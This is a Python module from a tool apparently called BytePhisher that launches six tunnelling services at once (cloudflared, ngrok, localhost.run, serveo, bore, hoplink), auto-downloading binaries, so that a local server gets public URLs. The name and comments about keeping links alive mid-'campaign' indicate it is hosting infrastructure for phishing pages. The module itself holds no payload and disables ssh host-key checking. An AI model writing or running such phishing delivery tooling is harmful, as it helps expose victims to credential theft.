# BytePhisher — 6-tunnel concurrent orchestration.
# Each tunneler adapter: ensure binary (auto-download if missing), start,
# parse its stdout for the public URL.
import os
import re
import shutil
import subprocess
import time
import sys

LOCAL_PORT_PLACEHOLDER = "{port}"

# All tunneler child processes, so we can shut them down on exit instead of
# leaving orphaned cloudflared/ssh processes behind after a session.
# Entries are (name, Popen) so a dead tunnel can be reported by name.
_PROCS = []


def _bg(cmd, log_path, cwd=None, name=None):
    # truncate: a stale log from a previous session would make _wait_url return
    # an old (dead) public URL instead of the one we just created
    log = open(log_path, "w")
    p = subprocess.Popen(cmd, stdout=log, stderr=log, cwd=cwd or os.path.dirname(log_path))
    # derive the tunneler name from its log file (logs/<name>.log) so a dead
    # tunnel can be reported by name without touching every adapter
    _PROCS.append((name or os.path.splitext(os.path.basename(log_path))[0], p))
    return p


def stop_all():
    """Terminate every tunneler we started. Returns how many were stopped."""
    stopped = 0
    for name, p in list(_PROCS):
        try:
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    p.kill()
                stopped += 1
        except Exception:
            pass
    _PROCS.clear()
    return stopped


def running():
    """PIDs of tunnelers still alive (for tests and status output)."""
    return [p.pid for _, p in _PROCS if p.poll() is None]


def running_names():
    """{name: pid} for live tunnelers."""
    return {name: p.pid for name, p in _PROCS if p.poll() is None}


def dead_names():
    """Tunnelers we started that have since exited — a dead public URL.

    Quick tunnels (cloudflared especially) can drop their edge connection and
    exit mid-campaign; the CLI watchdog uses this to warn instead of silently
    serving a dead link.
    """
    return [name for name, p in _PROCS if p.poll() is not None]

def _wait_url(pattern, log_path, timeout=15):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if os.path.isfile(log_path):
            with open(log_path, encoding="utf-8", errors="replace") as f:
                m = re.search(pattern, f.read())
            if m:
                return m.group(1)
        time.sleep(1)
    return None

class Tunneler:
    name = "base"
    url_pattern = "(https://[-0-9a-z.]*)"

    def __init__(self, port):
        self.port = port
        self.log = os.path.join("logs", f"{self.name}.log")
        os.makedirs("logs", exist_ok=True)
        self.bin_path = None  # absolute path resolved in ensure_binary()

    def _resolve(self, names):
        """Find a binary on PATH; remember the absolute path."""
        for n in names:
            p = shutil.which(n)
            if p:
                self.bin_path = os.path.abspath(p)
                return True
        return False

    def ensure_binary(self):
        """Return True if the tunneler is usable; download if auto_download and missing."""
        raise NotImplementedError

    def start(self):
        """Launch tunneler; return public URL or None."""
        raise NotImplementedError

class Cloudflared(Tunneler):
    name = "cloudflared"
    url_pattern = r"(https://[-0-9a-z.]{4,}.trycloudflare.com)"
    BINARY = "cloudflared"
    DOWNLOADS = {
        "linux-amd64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
        "linux-arm64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64",
        "darwin-amd64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64",
        "darwin-arm64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64",
    }

    def _key(self):
        import platform
        arch = "arm64" if platform.machine() in ("arm64", "aarch64") else "amd64"
        osname = {"linux": "linux", "darwin": "darwin"}.get(sys.platform)
        return f"{osname}-{arch}"

    def ensure_binary(self):
        if self._resolve([self.BINARY]):
            return True
        # try auto-download into <project>/bin
        key = self._key()
        url = self.DOWNLOADS.get(key)
        if not url:
            return False
        print(f"[bytephisher] cloudflared not found — downloading {key} ...")
        import urllib.request
        bindir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "bin")
        os.makedirs(bindir, exist_ok=True)
        dst = os.path.abspath(os.path.join(bindir, "cloudflared"))
        try:
            urllib.request.urlretrieve(url, dst)
            os.chmod(dst, 0o755)
            self.bin_path = dst
            return True
        except Exception as e:
            print(f"[bytephisher] cloudflared download failed: {e}")
            return False

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "tunnel", "--url", f"127.0.0.1:{self.port}"], self.log)
        url = _wait_url(self.url_pattern, self.log, 20)
        # The URL is printed before the edge connection registers; hitting it
        # early returns HTTP 530, so wait for the registration line.
        if url:
            _wait_url(r"(Registered tunnel connection)", self.log, 20)
        return url

class Ngrok(Tunneler):
    name = "ngrok"
    # ngrok serves both the legacy .ngrok.io and the current .ngrok-free.app host
    url_pattern = r"(https://[0-9a-z-]+\.ngrok(?:-free)?\.(?:app|io))"
    BINARY = "ngrok"

    def ensure_binary(self):
        return self._resolve([self.BINARY])

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "http", str(self.port)], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

class LocalHostRun(Tunneler):
    name = "localhost_run"
    url_pattern = r"(https://[-0-9a-z.]+\.lhr\.life)"

    def ensure_binary(self):
        return self._resolve(["ssh"])

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
             "-R", f"80:127.0.0.1:{self.port}", "nokey@localhost.run", "-T", "-n"], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

class Serveo(Tunneler):
    """Serveo has been flaky/sunset for years; the adapter is kept so that if
    the service comes back the flag works, but failure is handled gracefully."""
    name = "serveo"
    url_pattern = r"(https://[-0-9a-z.]+\.serveo\.net)"
    HOST = "serveo.net"

    def ensure_binary(self):
        return self._resolve(["ssh"])

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
             "-R", f"80:127.0.0.1:{self.port}", self.HOST, "-N"], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

class Bore(Tunneler):
    """bore tunnels a TCP port; the public relay answers with "bore.pub:<port>",
    so the usable URL is http://bore.pub:<port> (no TLS)."""
    name = "bore"
    url_pattern = r"(bore\.pub:\d+)"
    BINARY = "bore"
    RELAY = os.environ.get("BYTEPHISHER_BORE_RELAY", "bore.pub")
    RELEASES_API = "https://api.github.com/repos/ekzhang/bore/releases/latest"

    def ensure_binary(self):
        if self._resolve([self.BINARY]):
            return True
        # auto-download the prebuilt musl binary from GitHub releases
        import urllib.request, tarfile, io, json as _json, platform
        if platform.machine() not in ("x86_64", "AMD64", "aarch64", "arm64"):
            return False
        arch = "aarch64" if platform.machine() in ("aarch64", "arm64") else "x86_64"
        want = f"{arch}-unknown-linux-musl"
        try:
            req = urllib.request.Request(self.RELEASES_API,
                                         headers={"User-Agent": "bytephisher/1.0"})
            with urllib.request.urlopen(req, timeout=15) as r:
                rel = _json.loads(r.read().decode())
            asset = next((a for a in rel.get("assets", []) if want in a["name"]), None)
            if not asset:
                return False
            print(f"[bytephisher] bore not found — downloading {asset['name']} ...")
            bindir = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "bin"))
            os.makedirs(bindir, exist_ok=True)
            with urllib.request.urlopen(asset["browser_download_url"], timeout=60) as r:
                blob = r.read()
            with tarfile.open(fileobj=io.BytesIO(blob), mode="r:gz") as tf:
                member = next((m for m in tf.getmembers() if m.name.endswith("bore") and m.isfile()), None)
                if not member:
                    return False
                tf.extract(member, bindir)
            dst = os.path.join(bindir, member.name)
            os.chmod(dst, 0o755)
            self.bin_path = os.path.abspath(dst)
            return True
        except Exception as e:
            print(f"[bytephisher] bore download failed: {e}")
            return False

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "local", str(self.port), "--to", self.RELAY], self.log)
        hostport = _wait_url(self.url_pattern, self.log, 25)
        return f"http://{hostport}" if hostport else None

class HopLink(Tunneler):
    """hoplink.com has been unreliable for years; kept for completeness, and a
    dead service just yields None so the other tunnelers keep working."""
    name = "hoplink"
    url_pattern = r"(https://[-0-9a-z.]+\.hoplink\.com)"
    HOST = "hoplink.com"

    def ensure_binary(self):
        return self._resolve(["ssh"])

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
             "-R", f"80:127.0.0.1:{self.port}", self.HOST, "-N"], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

REGISTRY = {
    "cloudflared": Cloudflared,
    "ngrok": Ngrok,
    "localhost_run": LocalHostRun,
    "serveo": Serveo,
    "bore": Bore,
    "hoplink": HopLink,
}

def run_all(port):
    """Start every tunneler concurrently; return {name: url_or_None}."""
    results = {}
    for name, cls in REGISTRY.items():
        try:
            t = cls(port)
            results[name] = t.start()
        except Exception as e:
            print(f"[bytephisher] {name} failed: {e}")
            results[name] = None
    return results

def run_one(name, port):
    cls = REGISTRY.get(name)
    if not cls:
        return None
    return cls(port).start()
